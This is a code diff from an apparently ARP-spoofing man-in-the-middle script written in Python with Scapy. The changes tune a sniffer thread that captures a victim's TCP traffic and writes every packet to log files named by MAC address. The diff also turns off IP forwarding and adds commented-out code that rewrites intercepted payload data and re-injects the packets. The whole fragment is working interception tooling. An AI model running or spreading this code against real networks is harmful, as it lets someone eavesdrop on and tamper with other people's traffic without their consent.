@@ -134,9 +134,9 @@ def restore(routerIP, victimIP, routerMAC, victimMAC):
     myExit(0)
 
 def test(pkt):
-    # data = [method for method in dir(pkt) if callable(getattr(pkt, method))]
-    # for call in data:
-    #     print call
+    data = [method for method in dir(pkt) if callable(getattr(pkt, method))]
+    for call in data:
+        print call
     # pkt.show()
     pass
 
@@ -150,10 +150,12 @@ class Logger(threading.Thread):
 
     def run(self):
         self.canRun = True
-        sniff(prn=self.parsePacket, store=0, stopperTimeout=1, stopper=self.stopper)
+        sniff(prn=self.parsePacket, filter="tcp", store=0, stopperTimeout=1, stopper=self.stopper)
 
     def parsePacket(self, pkt):
-        print pkt.summary()
+        # test(pkt)
+        # exit(0)
+        print pkt.show()
         mac = pkt.sprintf("%Ether.src%")
         fileName = "./logs/" + mac.replace(':', '_')
         logFile = open(fileName, 'a+')
@@ -164,6 +166,18 @@ class Logger(threading.Thread):
             pkt.show()
         logFile.write('\n')
         logFile.close()
+        # self.stop()
+        # if pkt.haslayer(Raw):
+        #     if "image1" in pkt[Raw].load:
+        #         trrtt = pkt[Raw].load.replace("image1", "image0")
+        #         if "image0" in trrtt:
+        #             pkt[Raw].load = trrtt
+        #             print "&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&"
+        #             print pkt.sprintf("%Ether.dst%")
+        #             # sendp(pkt)
+        #             return
+        # send(pkt)
+        # exit(0)
 
     def stop(self):
         self.canRun = False
@@ -188,13 +202,13 @@ def main(args):
     if victimMAC == None:
         print "Could not find victim MAC address."
         myExit(0)
-    with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
-        ipf.write('1\n')
+    # with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
+    #     ipf.write('1\n')
     def signal_handler(signal, frame):
         print ""
         log.stop(); # stop thread
-        with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
-            ipf.write('0\n')
+        # with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
+        #     ipf.write('1\n')
         restore(routerIP, victimIP, routerMAC, victimMAC)
     signal.signal(signal.SIGINT, signal_handler)
 
